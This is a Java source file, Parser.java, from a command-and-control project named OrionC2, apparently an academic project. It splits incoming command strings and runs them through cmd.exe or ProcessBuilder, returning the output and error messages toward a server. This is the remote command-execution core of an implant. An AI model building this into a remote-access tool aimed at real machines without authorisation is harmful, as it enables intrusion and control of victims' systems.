// =============================================================================
// Project Name: OrionC2
// File: Parser.java
//
// Copyright (c) 2026 Alban LEAUTIER
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
// =============================================================================
package org.esisar.command_control.parsing;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.List;
import java.util.ArrayList;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Parser {
    public static java.io.File currentFile = new java.io.File(System.getProperty("user.dir"));

    public static List<String> commandSplit(String message){
        List<String> result = new ArrayList<>(); //making a list
        Pattern motif = Pattern.compile("(\"[^\"]+\"|\\S+)");
        Matcher chercheur = motif.matcher(message);

        while (chercheur.find()) {
            String morceau = chercheur.group(1);
            morceau = morceau.replace("\"", "");
            result.add(morceau);
        }
        for (int i = 0; i < result.size(); i++) {
            System.out.println("Case n°" + i + " -> [" + result.get(i) + "]");
        }
        return result;
    }
    private static String lireFlux(Process execute) throws IOException {
        java.io.InputStream flux = execute.getInputStream();
        java.io.BufferedReader lecteur = new java.io.BufferedReader(new java.io.InputStreamReader(flux));
        StringBuilder responses = new StringBuilder();
        String line;
        while ((line = lecteur.readLine()) != null) {
            responses.append(line).append("\n");
        }
        return responses.toString();
    }
    
    //lance une commande en paramétre
    public static String executeCommand(String command) throws IOException {
    	try {
    		ProcessBuilder proc =  new ProcessBuilder("cmd.exe"); // mettre cmd.exe
    		proc.redirectErrorStream(true);
    		Process pro = proc.start();
    		System.out.println(command);
    		try (PrintWriter writer = new PrintWriter(pro.getOutputStream())) {
                writer.println(command);
                writer.println("exit"); 
                writer.flush();
                StringBuilder output = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                        System.out.println(line); // Pour voir en temps réel dans ta console
                    }
                }
                return output.toString();
            }
    	} catch (IOException e) {
            if (e.getMessage().contains("error=2")) {
                Process executeFallback = new ProcessBuilder("cmd.exe", "/c" , String.join(" ", command)).directory(currentFile).start();
                return lireFlux(executeFallback);

            } else {
                // Si c'est une autre erreur grave, on la renvoie au serveur
                return "Erreur critique d'exécution : " + e.getMessage() + "\n";
            }
        }

    }
    //Lance un process en paramétre
    public static String executeProcess(String commande) throws IOException {

        List<String> command = commandSplit(commande);

        try {
            Process execute = new ProcessBuilder(command).directory(currentFile).start();

            return lireFlux(execute);
        } catch (IOException e) {
            if (e.getMessage().contains("error=2")) {
                Process executeFallback = new ProcessBuilder("cmd.exe", "/c" , String.join(" ", command)).directory(currentFile).start();
                return lireFlux(executeFallback);

            } else {
                // Si c'est une autre erreur grave, on la renvoie au serveur
                return "Erreur critique d'exécution : " + e.getMessage() + "\n";
            }
        }



    }}